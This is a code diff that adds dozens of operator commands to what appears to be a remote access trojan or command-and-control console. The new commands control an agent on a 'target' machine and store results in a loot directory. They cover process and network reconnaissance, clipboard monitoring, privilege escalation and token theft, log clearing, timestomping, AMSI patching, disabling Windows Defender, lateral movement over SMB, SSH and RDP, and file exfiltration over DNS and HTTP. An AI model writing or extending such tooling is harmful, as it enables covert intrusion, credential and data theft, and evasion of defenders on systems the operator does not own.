@@ -612,6 +612,568 @@ def cmd_forkbomb(session: Session, args: list[str]) -> CommandResult:
 
 
 # ---------------------------------------------------------------------------
+# Process & network intelligence
+# ---------------------------------------------------------------------------
+
+@_cmd("ps", usage="ps [filter]",
+      help_text="List running processes on the target; optional name/pid filter")
+def cmd_ps(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, ("ps " + " ".join(args)).strip())
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("kill", usage="kill <pid>",
+      help_text="Terminate a process on the target by PID")
+def cmd_kill(session: Session, args: list[str]) -> CommandResult:
+    if not args or not args[0].isdigit():
+        return _err("Usage: kill <pid>")
+    send_msg(session.conn, f"kill {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("netstat", usage="netstat",
+      help_text="Show active TCP/UDP connections and listening ports on the target")
+def cmd_netstat(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "netstat")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("arp", usage="arp",
+      help_text="Dump the ARP cache on the target — discover other hosts on the LAN")
+def cmd_arp(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "arp")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("dns_query", usage="dns_query <hostname>",
+      help_text="Resolve a hostname from the target's perspective")
+def cmd_dns_query(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: dns_query <hostname>")
+    send_msg(session.conn, f"dns_query {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("routes", usage="routes",
+      help_text="Print the IP routing table on the target")
+def cmd_routes(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "routes")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("ifconfig", usage="ifconfig",
+      help_text="Show all network interfaces and their IP/MAC addresses")
+def cmd_ifconfig(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "ifconfig")
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Environment & system discovery
+# ---------------------------------------------------------------------------
+
+@_cmd("env", usage="env [filter]",
+      help_text="Dump all environment variables from the target process; optional key filter")
+def cmd_env(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, ("env " + " ".join(args)).strip())
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("installed_software", usage="installed_software",
+      help_text="List installed programs (Windows: registry; Linux: dpkg/rpm/pacman)")
+def cmd_installed_software(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "installed_software")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("active_windows", usage="active_windows",
+      help_text="List all visible window titles on the target desktop")
+def cmd_active_windows(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "active_windows")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("scheduled_tasks", usage="scheduled_tasks",
+      help_text="Enumerate scheduled tasks / cron jobs on the target")
+def cmd_scheduled_tasks(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "scheduled_tasks")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("services", usage="services [filter]",
+      help_text="List running/stopped services on the target (Windows SCM / systemctl)")
+def cmd_services(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, ("services " + " ".join(args)).strip())
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("users", usage="users",
+      help_text="List local user accounts and groups on the target")
+def cmd_users(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "users")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("logged_in", usage="logged_in",
+      help_text="Show currently logged-in users (who/query user/w)")
+def cmd_logged_in(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "logged_in")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("startup_items", usage="startup_items",
+      help_text="List all autostart entries (registry Run keys, startup folder, LaunchDaemons)")
+def cmd_startup_items(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "startup_items")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("os_info", usage="os_info",
+      help_text="Extended OS fingerprint: build, patch level, install date, uptime")
+def cmd_os_info(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "os_info")
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# File intelligence
+# ---------------------------------------------------------------------------
+
+@_cmd("ls", usage="ls [path]",
+      help_text="List directory contents on the target with size/perms/date")
+def cmd_ls(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, ("ls " + " ".join(args)).strip())
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("cat", usage="cat <remote_file>",
+      help_text="Print the contents of a small text file on the target")
+def cmd_cat(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: cat <remote_file>")
+    send_msg(session.conn, f"cat {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("find_files", usage="find_files <path> <pattern>",
+      help_text="Recursively find files matching a glob pattern on the target")
+def cmd_find_files(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: find_files <path> <pattern>")
+    send_msg(session.conn, f"find_files {args[0]} {args[1]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("find_writable", usage="find_writable <path>",
+      help_text="Find world-writable files and directories under <path>")
+def cmd_find_writable(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: find_writable <path>")
+    send_msg(session.conn, f"find_writable {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("find_suid", usage="find_suid",
+      help_text="Find SUID/SGID binaries on the target — common privesc vectors")
+def cmd_find_suid(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "find_suid")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("file_hash", usage="file_hash <remote_path>",
+      help_text="Compute SHA-256 hash of a file on the target")
+def cmd_file_hash(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: file_hash <remote_path>")
+    send_msg(session.conn, f"file_hash {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("tail", usage="tail <remote_file> [lines]",
+      help_text="Print the last N lines of a file on the target (default 20)")
+def cmd_tail(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: tail <remote_file> [lines]")
+    send_msg(session.conn, ("tail " + " ".join(args)).strip())
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("write_file", usage="write_file <remote_path> <content>",
+      help_text="Write arbitrary text content into a file on the target")
+def cmd_write_file(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: write_file <remote_path> <content>")
+    send_msg(session.conn, "write_file " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("mkdir", usage="mkdir <remote_path>",
+      help_text="Create a directory on the target")
+def cmd_mkdir(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: mkdir <remote_path>")
+    send_msg(session.conn, f"mkdir {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("rm", usage="rm <remote_path>",
+      help_text="Delete a file or directory on the target",
+      dangerous=True)
+def cmd_rm(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: rm <remote_path>")
+    send_msg(session.conn, f"rm {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("chmod", usage="chmod <mode> <remote_path>",
+      help_text="Change file permissions on the target (Unix only)")
+def cmd_chmod(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: chmod <mode> <remote_path>")
+    send_msg(session.conn, f"chmod {args[0]} {args[1]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("zip_upload", usage="zip_upload <local_dir> <remote_name>",
+      help_text="Zip a local directory and upload the archive to the target in one transfer")
+def cmd_zip_upload(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: zip_upload <local_dir> <remote_name>")
+    local_dir = args[0]
+    remote_name = args[1]
+    if not os.path.isdir(local_dir):
+        return _err(f"Local directory not found: {local_dir}")
+    import tempfile, zipfile as _zipfile
+    with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
+        tmp_path = tmp.name
+    try:
+        with _zipfile.ZipFile(tmp_path, "w", _zipfile.ZIP_DEFLATED) as zf:
+            for root, dirs, files in os.walk(local_dir):
+                for fname in files:
+                    full = os.path.join(root, fname)
+                    arc  = os.path.relpath(full, local_dir)
+                    zf.write(full, arc)
+        send_msg(session.conn, f"upload {remote_name}")
+        send_file(session.conn, tmp_path)
+        try:
+            ack = recv_msg(session.conn)
+        except Exception:
+            ack = ""
+        return _ok(f"[+] Uploaded '{local_dir}' as '{remote_name}'"
+                   + (f"\n    Agent: {ack}" if ack else ""))
+    finally:
+        try:
+            os.unlink(tmp_path)
+        except OSError:
+            pass
+
+
+# ---------------------------------------------------------------------------
+# Advanced clipboard
+# ---------------------------------------------------------------------------
+
+@_cmd("clip_watch", usage="clip_watch <seconds>",
+      help_text="Poll clipboard every 2s for <seconds> — capture anything pasted")
+def cmd_clip_watch(session: Session, args: list[str]) -> CommandResult:
+    if not args or not args[0].isdigit():
+        return _err("Usage: clip_watch <seconds>")
+    seconds = int(args[0])
+    send_msg(session.conn, f"clip_watch {seconds}")
+    old_timeout = session.conn.gettimeout()
+    session.conn.settimeout(seconds + 10)
+    try:
+        return _ok(recv_msg(session.conn))
+    except Exception as e:
+        return _err(f"clip_watch failed: {e}")
+    finally:
+        session.conn.settimeout(old_timeout)
+
+
+# ---------------------------------------------------------------------------
+# GUI & interaction
+# ---------------------------------------------------------------------------
+
+@_cmd("screenshot_region", usage="screenshot_region <x> <y> <w> <h>",
+      help_text="Capture a specific screen region on the target and pull it back")
+def cmd_screenshot_region(session: Session, args: list[str]) -> CommandResult:
+    if len(args) != 4 or not all(a.isdigit() for a in args):
+        return _err("Usage: screenshot_region <x> <y> <width> <height>")
+    local = session.screenshot_path()
+    send_msg(session.conn, f"screenshot_region {' '.join(args)}")
+    err = _recv_file_or_err(session.conn, local, timeout=20)
+    if err:
+        return err
+    return _ok(f"[+] Region screenshot saved: {local}")
+
+
+@_cmd("notify", usage="notify <title> <message>",
+      help_text="Show a system tray / desktop notification on the target (silent)")
+def cmd_notify(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: notify <title> <message>")
+    send_msg(session.conn, "notify " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("open_url", usage="open_url <url>",
+      help_text="Silently open a URL in the target's default browser")
+def cmd_open_url(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: open_url <url>")
+    send_msg(session.conn, f"open_url {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("play_sound", usage="play_sound <remote_wav_path>",
+      help_text="Play a WAV file through the target's audio output")
+def cmd_play_sound(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: play_sound <remote_wav_path>")
+    send_msg(session.conn, f"play_sound {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("set_wallpaper", usage="set_wallpaper <remote_image_path>",
+      help_text="Change the desktop wallpaper on the target to any image already on disk")
+def cmd_set_wallpaper(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: set_wallpaper <remote_image_path>")
+    send_msg(session.conn, f"set_wallpaper {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Token & privilege utilities
+# ---------------------------------------------------------------------------
+
+@_cmd("whoami_priv", usage="whoami_priv",
+      help_text="List all privileges for the current token (Windows: whoami /priv)")
+def cmd_whoami_priv(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "whoami_priv")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("make_token", usage="make_token <username> <domain> <password>",
+      help_text="Create a logon token for another user without starting a new process",
+      dangerous=True)
+def cmd_make_token(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 3:
+        return _err("Usage: make_token <username> <domain> <password>")
+    send_msg(session.conn, "make_token " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("rev2self", usage="rev2self",
+      help_text="Revert to the original process token (undo make_token / token_steal)")
+def cmd_rev2self(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "rev2self")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("getsystem", usage="getsystem",
+      help_text="Attempt automated local privilege escalation to SYSTEM/root",
+      dangerous=True)
+def cmd_getsystem(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "getsystem")
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Evasion & anti-forensics
+# ---------------------------------------------------------------------------
+
+@_cmd("timestomp", usage="timestomp <remote_path> <reference_path>",
+      help_text="Copy MAC timestamps from <reference_path> onto <remote_path>",
+      dangerous=True)
+def cmd_timestomp(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: timestomp <remote_path> <reference_path>")
+    send_msg(session.conn, "timestomp " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("clear_logs", usage="clear_logs [windows|linux|all]",
+      help_text="Clear Windows Event Logs or Linux syslog/auth/bash_history",
+      dangerous=True)
+def cmd_clear_logs(session: Session, args: list[str]) -> CommandResult:
+    target = args[0].lower() if args else "all"
+    if target not in ("windows", "linux", "all"):
+        return _err("Usage: clear_logs [windows|linux|all]")
+    send_msg(session.conn, f"clear_logs {target}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("patch_amsi", usage="patch_amsi",
+      help_text="Patch AMSI in the current process to bypass Windows Defender scanning",
+      dangerous=True)
+def cmd_patch_amsi(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "patch_amsi")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("disable_defender", usage="disable_defender",
+      help_text="Disable Windows Defender real-time protection via registry (needs admin)",
+      dangerous=True)
+def cmd_disable_defender(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "disable_defender")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("hide_file", usage="hide_file <remote_path>",
+      help_text="Set hidden+system attributes on a file on the target (Windows)")
+def cmd_hide_file(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: hide_file <remote_path>")
+    send_msg(session.conn, f"hide_file {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Lateral movement helpers
+# ---------------------------------------------------------------------------
+
+@_cmd("ping_sweep", usage="ping_sweep <cidr>",
+      help_text="ICMP ping sweep over a CIDR range from the target (maps LAN)")
+def cmd_ping_sweep(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: ping_sweep <cidr>  e.g.  ping_sweep 192.168.1.0/24")
+    send_msg(session.conn, f"ping_sweep {args[0]}")
+    old = session.conn.gettimeout()
+    session.conn.settimeout(120)
+    try:
+        return _ok(recv_msg(session.conn))
+    except Exception as e:
+        return _err(f"ping_sweep error: {e}")
+    finally:
+        session.conn.settimeout(old)
+
+
+@_cmd("smb_shares", usage="smb_shares <host>",
+      help_text="List SMB shares exposed by a host reachable from the target")
+def cmd_smb_shares(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: smb_shares <host>")
+    send_msg(session.conn, f"smb_shares {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("ssh_connect", usage="ssh_connect <user> <host> [port]",
+      help_text="Open an SSH connection from the target to another host (uses agent's key store)")
+def cmd_ssh_connect(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: ssh_connect <user> <host> [port]")
+    send_msg(session.conn, "ssh_connect " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("rdp_enable", usage="rdp_enable",
+      help_text="Enable Remote Desktop on the target and open firewall rule (Windows, needs admin)",
+      dangerous=True)
+def cmd_rdp_enable(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "rdp_enable")
+    return _ok(recv_msg(session.conn))
+
+
+# ---------------------------------------------------------------------------
+# Exfiltration
+# ---------------------------------------------------------------------------
+
+@_cmd("exfil_dns", usage="exfil_dns <remote_file> <domain>",
+      help_text="Exfiltrate a small file via DNS TXT queries to operator-controlled domain")
+def cmd_exfil_dns(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: exfil_dns <remote_file> <domain>")
+    send_msg(session.conn, "exfil_dns " + " ".join(args))
+    old = session.conn.gettimeout()
+    session.conn.settimeout(60)
+    try:
+        return _ok(recv_msg(session.conn))
+    except Exception as e:
+        return _err(f"exfil_dns error: {e}")
+    finally:
+        session.conn.settimeout(old)
+
+
+@_cmd("exfil_http", usage="exfil_http <remote_file> <url>",
+      help_text="POST a file from the target to an HTTP endpoint (curl/wget fallback)")
+def cmd_exfil_http(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: exfil_http <remote_file> <url>")
+    send_msg(session.conn, "exfil_http " + " ".join(args))
+    old = session.conn.gettimeout()
+    session.conn.settimeout(60)
+    try:
+        return _ok(recv_msg(session.conn))
+    except Exception as e:
+        return _err(f"exfil_http error: {e}")
+    finally:
+        session.conn.settimeout(old)
+
+
+# ---------------------------------------------------------------------------
+# Operator-side loot helpers (no agent round-trip)
+# ---------------------------------------------------------------------------
+
+@_cmd("loot_list", usage="loot_list",
+      help_text="Show all files collected from this session in the loot directory")
+def cmd_loot_list(session: Session, args: list[str]) -> CommandResult:
+    loot_dir = session.loot_dir()
+    if not os.path.isdir(loot_dir):
+        return _ok(f"[*] No loot collected yet for session #{session.id}")
+    files = []
+    for root, _dirs, fnames in os.walk(loot_dir):
+        for fname in sorted(fnames):
+            full = os.path.join(root, fname)
+            size = os.path.getsize(full)
+            rel  = os.path.relpath(full, loot_dir)
+            files.append(f"  {rel:<48} {size:>10,} B")
+    if not files:
+        return _ok(f"[*] Loot directory is empty: {loot_dir}")
+    header = f"[+] Loot for session #{session.id}  ({loot_dir})\n"
+    return _ok(header + "\n".join(files))
+
+
+@_cmd("note", usage="note <text>",
+      help_text="Append a timestamped operator note to this session's notes file")
+def cmd_note(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: note <text>")
+    text = " ".join(args)
+    notes_path = os.path.join(session.loot_dir(), "notes.txt")
+    os.makedirs(session.loot_dir(), exist_ok=True)
+    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+    with open(notes_path, "a", encoding="utf-8") as fh:
+        fh.write(f"[{ts}] {text}\n")
+    return _ok(f"Note saved to {notes_path}")
+
+
+@_cmd("notes", usage="notes",
+      help_text="Show all operator notes for this session")
+def cmd_notes(session: Session, args: list[str]) -> CommandResult:
+    notes_path = os.path.join(session.loot_dir(), "notes.txt")
+    if not os.path.isfile(notes_path):
+        return _ok(f"[*] No notes for session #{session.id}")
+    with open(notes_path, "r", encoding="utf-8") as fh:
+        content = fh.read()
+    return _ok(content if content.strip() else "[*] Notes file is empty")
+
+
+@_cmd("tag", usage="tag <label>",
+      help_text="Tag this session with a label (stored in loot dir, shown in sessions list)")
+def cmd_tag(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: tag <label>")
+    label = " ".join(args)
+    tag_path = os.path.join(session.loot_dir(), ".tag")
+    os.makedirs(session.loot_dir(), exist_ok=True)
+    with open(tag_path, "w", encoding="utf-8") as fh:
+        fh.write(label)
+    session.tag = label          # set in-memory attribute for prompt display
+    return _ok(f"Session #{session.id} tagged: {label}")
+
+
+# ---------------------------------------------------------------------------
 # Toolbox
 # ---------------------------------------------------------------------------
 
@@ -642,10 +1204,17 @@ def cmd_toolbox_deploy(session: Session, args: list[str]) -> CommandResult:
 
 
 # ---------------------------------------------------------------------------
-# Dispatcher
+# Public API — used by cli.py and tests
 # ---------------------------------------------------------------------------
 
 def dispatch(session: Session, raw: str) -> CommandResult:
+    """
+    Parse *raw* into a command name + args and invoke the matching handler.
+
+    Unknown commands are forwarded as raw shell commands to the agent
+    (the shell-fallback behaviour described in the module docstring).
+    The audit log entry is always written.
+    """
     parts = raw.strip().split()
     if not parts:
         return _ok()
@@ -661,6 +1230,7 @@ def dispatch(session: Session, raw: str) -> CommandResult:
         except Exception as e:
             result = _err(f"[-] Error: {e}")
     else:
+        # Shell fallback — forward raw string to the agent unchanged
         try:
             send_msg(session.conn, raw)
             result = _ok(recv_msg(session.conn))
@@ -674,4 +1244,7 @@ def dispatch(session: Session, raw: str) -> CommandResult:
 
 
 def all_commands() -> dict[str, _CommandDef]:
+    """Return a snapshot of the command registry (name → _CommandDef)."""
     return dict(_registry)
+
+
